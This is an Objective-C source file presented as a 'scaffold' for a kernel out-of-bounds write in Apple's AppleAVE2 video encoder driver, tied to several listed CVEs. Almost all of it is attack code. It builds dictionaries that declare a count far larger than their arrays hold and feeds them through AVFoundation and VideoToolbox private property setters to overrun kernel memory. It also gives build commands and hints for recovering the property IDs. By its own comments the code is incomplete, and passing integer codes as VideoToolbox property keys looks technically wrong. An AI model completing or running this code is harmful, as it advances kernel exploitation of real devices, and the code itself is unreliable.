//
//  ave_encoder_oob_scaffold.m — SCAFFOLD, not an exploit.
//
//  Target : CVE-2026-112469 / 112468 / 112466 / 112470 / 112689 / 112705
//           (com.apple.driver.AppleAVE2)
//  Theory : a VideoToolbox / AVE2 property setter copies `count` entries
//           from a caller dictionary into a kernel array sized for a maximum
//           count, without validating `count`.
//  Status : the private property IDs and the exact dictionary key are NOT
//           known from the workspace diffs. The scaffold drives the public
//           AVFoundation surface with a deliberately malformed property and
//           is intended to be swapped to VTSessionSetProperty(<private id>)
//           once the selector is recovered from disassembly.
//
//  Build  : xcrun -sdk iphoneos clang -arch arm64 -fobjc-arc \
//              -framework AVFoundation -framework VideoToolbox \
//              ave_encoder_oob_scaffold.m -o ave_oob
//

#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>

// ---------------------------------------------------------------------------
// REPLACE AFTER DISASSEMBLY
// ---------------------------------------------------------------------------

// Private VideoToolbox property IDs are 4CC codes. Candidates whose handler
// likely calls the new +3 validation helpers (from the AppleAVE2 diff):
//
//   'ROI '  region-of-interest map
//   'SLIC'  slice map
//   'QP  '  per-slice QP
//   'RCL '  reference list
//
// Enumerate with: strings AppleAVE2 | grep -i -E 'roi|slice|qp'
//
static const int32_t kSuspectPropertyROI    = 0x524F4920; // 'ROI '
static const int32_t kSuspectPropertySlice  = 0x534C4943; // 'SLIC'

// The "count" field that is trusted. For a dictionary-of-arrays property the
// count is simply the array length, but the vulnerable parser may read a
// separate "count" key inside the value.
static NSString *const kCountKey = @"count";

// A count large enough to exceed any plausible maximum entry count.
static const NSUInteger kMaliciousCount = 0x100000;

// ---------------------------------------------------------------------------

static void fail(NSString *msg) {
    fprintf(stderr, "[-] %s\n", msg.UTF8String);
}

// Build a value with a huge entry count, so the pre-fix setter overruns.
static id maliciousCountValue(void) {
    NSMutableArray *arr = [NSMutableArray arrayWithCapacity:16];
    for (NSUInteger i = 0; i < 16; i++) {
        // Dummy entry; the exact entry schema must be discovered.
        [arr addObject:@{ @"x": @(i), @"y": @(i), @"w": @(1), @"h": @(1) }];
    }
    // The lie: declare a much larger count than the array really has.
    return @{ kCountKey: @(kMaliciousCount), @"entries": arr };
}

static void drive_session_with_malicious_property(void) {
    NSError *err = nil;

    // Small frame so the encoder's internal arrays are as small as possible.
    NSDictionary *settings = @{
        AVVideoCodecKey: AVVideoCodecTypeH264,
        AVVideoWidthKey:  @16,
        AVVideoHeightKey: @16,
    };

    AVAssetWriter *writer =
        [AVAssetWriter assetWriterWithURL:[NSURL fileURLWithPath:
            [NSTemporaryDirectory() stringByAppendingPathComponent:@"out.mov"]]
                                  fileType:AVFileTypeQuickTimeMovie
                                     error:&err];
    if (!writer) { fail(err.description); return; }

    NSDictionary *compression = @{
        AVVideoExpectedSourceFrameRateKey: @30,
        AVVideoMaxKeyFrameIntervalKey:     @1,
        // The malformed arrays are supplied here; the exact AVFoundation key
        // that forwards to the AVE2 setter must be confirmed.
        @"ROIMap":    maliciousCountValue(),
        @"SliceMap":  maliciousCountValue(),
    };

    AVAssetWriterInput *input =
        [AVAssetWriterInput assetWriterInputWithMediaType:AVMediaTypeVideo
                                           outputSettings:@{
            AVVideoCodecKey: AVVideoCodecTypeH264,
            AVVideoWidthKey:  @16,
            AVVideoHeightKey: @16,
            AVVideoCompressionPropertiesKey: compression,
        }];
    input.expectsMediaDataInRealTime = NO;
    if (![writer canAddInput:input]) { fail(@"cannot add input"); return; }
    [writer addInput:input];

    if (![writer startWriting]) { fail(writer.error.description); return; }
    [writer startSessionAtSourceTime:kCMTimeZero];

    // Push one frame to force encoder setup.
    NSDictionary *attrs = @{
        (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA),
        (id)kCVPixelBufferWidthKey:  @16,
        (id)kCVPixelBufferHeightKey: @16,
    };
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, 16, 16,
                        kCVPixelFormatType_32BGRA, (__bridge CFDictionaryRef)attrs, &pb);
    if (pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddress(pb), 0x80,
               CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);

        CMTime pts = CMTimeMake(0, 30);
        CMVideoFormatDescriptionRef fmt = NULL;
        CMVideoFormatDescriptionCreateForImageBuffer(kCFAllocatorDefault, pb,
                                                    &fmt);
        CMSampleBufferRef sb = NULL;
        CMSampleTimingInfo timing = { CMTimeMake(1, 30), pts, kCMTimeInvalid };
        CMSampleBufferCreateForImageBuffer(kCFAllocatorDefault, pb, true,
                                           NULL, NULL, fmt, &timing, &sb);
        if (sb) {
            if (![input appendSampleBuffer:sb]) {
                fail(input.error.description);
            }
            CFRelease(sb);
        }
        if (fmt) CFRelease(fmt);
        CFRelease(pb);
    }

    [input markAsFinished];
    [writer finishWritingWithCompletionHandler:^{ }];
}

// Path B: go straight to VideoToolbox with the private property IDs.
static void drive_vt_with_private_property(void) {
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 16, 16,
                     kCMVideoCodecType_H264, NULL, NULL, NULL, NULL, NULL,
                     &session);
    if (st != noErr || !session) {
        fprintf(stderr, "[-] VTCompressionSessionCreate: %d\n", (int)st);
        return;
    }

    id value = maliciousCountValue();
    const int32_t props[2] = { kSuspectPropertyROI, kSuspectPropertySlice };
    for (int i = 0; i < 2; i++) {
        // NSDictionary is not the real CFType for these properties; the exact
        // expected CFType (CFArray/CFData) must be recovered from the binary.
        OSStatus s = VTSessionSetProperty(session, props[i],
                                          (__bridge CFTypeRef)value);
        printf("[*] VTSessionSetProperty('%c%c%c%c') -> %d\n",
               (props[i] >> 24) & 0xff, (props[i] >> 16) & 0xff,
               (props[i] >> 8) & 0xff, props[i] & 0xff, (int)s);
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

int main(int argc, char **argv) {
    @autoreleasepool {
        printf("[*] AVFoundation path\n");
        drive_session_with_malicious_property();
        printf("[*] VideoToolbox private-property path\n");
        drive_vt_with_private_property();
        printf("[*] done; if this returned cleanly, the selector/type is wrong\n");
    }
    return 0;
}
